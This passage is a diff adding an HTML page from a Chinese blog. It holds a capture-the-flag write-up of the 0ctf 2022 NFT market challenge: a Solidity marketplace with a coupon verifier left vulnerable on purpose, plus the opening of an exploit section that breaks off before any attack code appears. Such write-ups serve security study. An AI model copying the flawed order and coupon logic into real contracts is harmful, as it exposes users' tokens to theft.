@@ -1,0 +1,1201 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta http-equiv="content-language" content="zh-cn">
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #ff009e;
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #e6006b, 0 0 5px #ff009e;
+    }
+    .pace .pace-activity {
+        border-top-color: #ff009e;
+        border-left-color: #ff009e;
+    }
+</style>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="0ctf2022,NFT,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="pikachu's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.png?v=5.1.0">
+
+
+
+
+
+
+<meta name="description" content="前言  0ctf 2022 nft 题目，失败的复盘，赛中调试出来了进入 verifyCoupon 后 orderid 会变成 0，虽然赛时不知道为什么，赛后知道了是olidity 8.16版本之前的 bug 具体就不分析了，别的师傅已经写的很好了，这里就只放出自己的 exp 参考 https://s3cunda.github.io/2022/09/19/0ctf-2022-NFT-Market.">
+<meta name="keywords" content="0ctf2022,NFT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0ctf 2022 nft market">
+<meta property="og:url" content="https://hitcxy.com/2022/0ctf2022/index.html">
+<meta property="og:site_name" content="pikachu&#39;s Blog">
+<meta property="og:description" content="前言  0ctf 2022 nft 题目，失败的复盘，赛中调试出来了进入 verifyCoupon 后 orderid 会变成 0，虽然赛时不知道为什么，赛后知道了是olidity 8.16版本之前的 bug 具体就不分析了，别的师傅已经写的很好了，这里就只放出自己的 exp 参考 https://s3cunda.github.io/2022/09/19/0ctf-2022-NFT-Market.">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/0ctf2022/1.jpg">
+<meta property="og:updated_time" content="2022-09-19T12:51:55.330Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="0ctf 2022 nft market">
+<meta name="twitter:description" content="前言  0ctf 2022 nft 题目，失败的复盘，赛中调试出来了进入 verifyCoupon 后 orderid 会变成 0，虽然赛时不知道为什么，赛后知道了是olidity 8.16版本之前的 bug 具体就不分析了，别的师傅已经写的很好了，这里就只放出自己的 exp 参考 https://s3cunda.github.io/2022/09/19/0ctf-2022-NFT-Market.">
+<meta name="twitter:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/0ctf2022/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"right","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'RI3NF6GUI0',
+      apiKey: '3d33fa60ba30d3b17f37220bb1a36749',
+      indexName: 'blogIndex',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://hitcxy.com/2022/0ctf2022/">
+
+
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+  <title> 0ctf 2022 nft market | pikachu's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?41fc030db57d5570dd22f78997dc4a7e";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+	<a href="https://github.com/hitcxy/blog" rel="external nofollow noopener noreferrer" target="_blank"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://camo.githubusercontent.com/82b228a3648bf44fc1163ef44c62fcc60081495e/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f6c6566745f7265645f6161303030302e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_left_red_aa0000.png"></a>
+
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">pikachu's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <h1 class="site-subtitle" itemprop="description">Easy coding,easy life.</h1>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-guestbook">
+          <a href="/guestbook" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-commenting"></i> <br>
+            
+            留言
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br>
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="https://hitcxy.com/2022/0ctf2022/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="pikachu">
+    <meta itemprop="description" content>
+    <meta itemprop="image" content="/images/avatar/1.jpg">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="pikachu's Blog">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="pikachu's Blog" src>
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                0ctf 2022 nft market
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-09-19T20:36:49+08:00">
+                2022-09-19
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2022-09-19T20:51:55+08:00">
+                2022-09-19
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/0ctf-2022/" itemprop="url" rel="index">
+                    <span itemprop="name">0ctf 2022</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+
+          
+
+          
+
+          
+
+          
+          
+             <span id="/2022/0ctf2022/" class="leancloud_visitors" data-flag-title="0ctf 2022 nft market">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          <br><span class="post-time">
+           <span class="post-meta-item-icon">
+             <i class="fa fa-edit"></i>
+           </span>
+           <span class="post-meta-item-text">WordCount:</span>
+           <span class="post-count">3,267字</span>
+			<span class="post-meta-divider">|</span>
+			<span class="post-meta-item-text">min2read:</span>
+           <span class="post-count">20分钟</span>
+
+         </span>
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><p><strong>前言</strong></p>
+<ul>
+<li>0ctf 2022 nft 题目，失败的复盘，赛中调试出来了进入 verifyCoupon 后 orderid 会变成 0，虽然赛时不知道为什么，赛后知道了是olidity 8.16版本之前的 bug</li>
+<li>具体就不分析了，别的师傅已经写的很好了，这里就只放出自己的 exp</li>
+<li>参考 <a href="https://s3cunda.github.io/2022/09/19/0ctf-2022-NFT-Market.html" rel="external nofollow noopener noreferrer" target="_blank">https://s3cunda.github.io/2022/09/19/0ctf-2022-NFT-Market.html</a></li>
+</ul>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/0ctf2022/1.jpg" alt></p>
+<a id="more"></a>
+<h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.15;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract TctfNFT is ERC721, Ownable &#123;</span><br><span class="line">    constructor() ERC721(&quot;TctfNFT&quot;, &quot;TNFT&quot;) &#123;</span><br><span class="line">        _setApprovalForAll(address(this), msg.sender, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 tokenId) external onlyOwner &#123;</span><br><span class="line">        _mint(to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TctfToken is ERC20 &#123;</span><br><span class="line">    bool airdropped;</span><br><span class="line"></span><br><span class="line">    constructor() ERC20(&quot;TctfToken&quot;, &quot;TTK&quot;) &#123;</span><br><span class="line">        _mint(address(this), 100000000000);</span><br><span class="line">        _mint(msg.sender, 1337);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function airdrop() external &#123;</span><br><span class="line">        require(!airdropped, &quot;Already airdropped&quot;);</span><br><span class="line">        airdropped = true;</span><br><span class="line">        _mint(msg.sender, 5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Order &#123;</span><br><span class="line">    address nftAddress;</span><br><span class="line">    uint256 tokenId;</span><br><span class="line">    uint256 price;</span><br><span class="line">&#125;</span><br><span class="line">struct Coupon &#123;</span><br><span class="line">    uint256 orderId;</span><br><span class="line">    uint256 newprice;</span><br><span class="line">    address issuer;</span><br><span class="line">    address user;</span><br><span class="line">    bytes reason;</span><br><span class="line">&#125;</span><br><span class="line">struct Signature &#123;</span><br><span class="line">    uint8 v;</span><br><span class="line">    bytes32[2] rs;</span><br><span class="line">&#125;</span><br><span class="line">struct SignedCoupon &#123;</span><br><span class="line">    Coupon coupon;</span><br><span class="line">    Signature signature;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TctfMarket &#123;</span><br><span class="line">    event SendFlag();</span><br><span class="line">    event NFTListed(</span><br><span class="line">        address indexed seller,</span><br><span class="line">        address indexed nftAddress,</span><br><span class="line">        uint256 indexed tokenId,</span><br><span class="line">        uint256 price</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    event NFTCanceled(</span><br><span class="line">        address indexed seller,</span><br><span class="line">        address indexed nftAddress,</span><br><span class="line">        uint256 indexed tokenId</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    event NFTBought(</span><br><span class="line">        address indexed buyer,</span><br><span class="line">        address indexed nftAddress,</span><br><span class="line">        uint256 indexed tokenId,</span><br><span class="line">        uint256 price</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    bool tested;</span><br><span class="line">    TctfNFT public tctfNFT;</span><br><span class="line">    TctfToken public tctfToken;</span><br><span class="line">    CouponVerifierBeta public verifier;</span><br><span class="line">    Order[] orders;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        tctfToken = new TctfToken();</span><br><span class="line">        tctfToken.approve(address(this), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        tctfNFT = new TctfNFT();</span><br><span class="line">        tctfNFT.mint(address(tctfNFT), 1);</span><br><span class="line">        tctfNFT.mint(address(this), 2);</span><br><span class="line">        tctfNFT.mint(address(this), 3);</span><br><span class="line"></span><br><span class="line">        verifier = new CouponVerifierBeta();</span><br><span class="line"></span><br><span class="line">        orders.push(Order(address(tctfNFT), 1, 1));</span><br><span class="line">        orders.push(Order(address(tctfNFT), 2, 1337));</span><br><span class="line">        orders.push(Order(address(tctfNFT), 3, 13333333337));</span><br><span class="line">        //                                     100000000000</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getOrder(uint256 orderId) public view returns (Order memory order) &#123;</span><br><span class="line">        require(orderId &lt; orders.length, &quot;Invalid orderId&quot;);</span><br><span class="line">        order = orders[orderId];        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) &#123;</span><br><span class="line">        require(price &gt; 0, &quot;Invalid price&quot;);</span><br><span class="line">        require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), &quot;Not owner&quot;);</span><br><span class="line">        orders.push(Order(nftAddress, tokenId, price));</span><br><span class="line">        emit NFTListed(msg.sender, nftAddress, tokenId, price);</span><br><span class="line">        return orders.length - 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function cancelOrder(uint256 orderId) external &#123;</span><br><span class="line">        Order memory order = getOrder(orderId);</span><br><span class="line">        require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), &quot;Not owner&quot;);</span><br><span class="line">        _deleteOrder(orderId);</span><br><span class="line">        emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function purchaseOrder(uint256 orderId) external &#123;</span><br><span class="line">        Order memory order = getOrder(orderId);</span><br><span class="line">        _deleteOrder(orderId);</span><br><span class="line">        IERC721 nft = IERC721(order.nftAddress);</span><br><span class="line">        address owner = nft.ownerOf(order.tokenId);</span><br><span class="line">        tctfToken.transferFrom(msg.sender, owner, order.price);</span><br><span class="line">        nft.safeTransferFrom(owner, msg.sender, order.tokenId);</span><br><span class="line">        emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function purchaseWithCoupon(SignedCoupon calldata scoupon) external &#123;</span><br><span class="line">        Coupon memory coupon = scoupon.coupon;</span><br><span class="line">        require(coupon.user == msg.sender, &quot;Invalid user&quot;);</span><br><span class="line">        require(coupon.newprice &gt; 0, &quot;Invalid price&quot;);</span><br><span class="line">        verifier.verifyCoupon(scoupon);</span><br><span class="line">        Order memory order = getOrder(coupon.orderId);</span><br><span class="line">        _deleteOrder(coupon.orderId);</span><br><span class="line">        IERC721 nft = IERC721(order.nftAddress);</span><br><span class="line">        address owner = nft.ownerOf(order.tokenId);</span><br><span class="line">        tctfToken.transferFrom(coupon.user, owner, coupon.newprice);</span><br><span class="line">        nft.safeTransferFrom(owner, coupon.user, order.tokenId);</span><br><span class="line">        emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external &#123;</span><br><span class="line">        require(!tested, &quot;Tested&quot;);</span><br><span class="line">        tested = true;</span><br><span class="line">        IERC721 nft = IERC721(nftAddress);</span><br><span class="line">        uint256 orderId = TctfMarket(this).createOrder(nftAddress, tokenId, price);</span><br><span class="line">        nft.approve(address(this), tokenId);</span><br><span class="line">        TctfMarket(this).purchaseOrder(orderId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function win() external &#123;</span><br><span class="line">        require(tctfNFT.ownerOf(1) == msg.sender &amp;&amp; tctfNFT.ownerOf(2) == msg.sender &amp;&amp; tctfNFT.ownerOf(3) == msg.sender);</span><br><span class="line">        emit SendFlag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) &#123;</span><br><span class="line">        IERC721 nft = IERC721(nftAddress);</span><br><span class="line">        address owner = nft.ownerOf(tokenId);</span><br><span class="line">        return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _deleteOrder(uint256 orderId) internal &#123;</span><br><span class="line">        orders[orderId] = orders[orders.length - 1];</span><br><span class="line">        orders.pop();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) &#123;</span><br><span class="line">        return this.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CouponVerifierBeta &#123;</span><br><span class="line">    TctfMarket market;</span><br><span class="line">    bool tested;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        market = TctfMarket(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function verifyCoupon(SignedCoupon calldata scoupon) public &#123;</span><br><span class="line">        require(!tested, &quot;Tested&quot;);</span><br><span class="line">        tested = true;</span><br><span class="line">        Coupon memory coupon = scoupon.coupon;</span><br><span class="line">        Signature memory sig = scoupon.signature;</span><br><span class="line">        Order memory order = market.getOrder(coupon.orderId);</span><br><span class="line">        bytes memory serialized = abi.encode(</span><br><span class="line">            &quot;I, the issuer&quot;, coupon.issuer,</span><br><span class="line">            &quot;offer a special discount for&quot;, coupon.user,</span><br><span class="line">            &quot;to buy&quot;, order, &quot;at&quot;, coupon.newprice,</span><br><span class="line">            &quot;because&quot;, coupon.reason</span><br><span class="line">        );</span><br><span class="line">        IERC721 nft = IERC721(order.nftAddress);</span><br><span class="line">        address owner = nft.ownerOf(order.tokenId);</span><br><span class="line">        require(coupon.issuer == owner, &quot;Invalid issuer&quot;);</span><br><span class="line">        require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, &quot;Invalid signature&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><ul>
+<li>attack.sol</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span 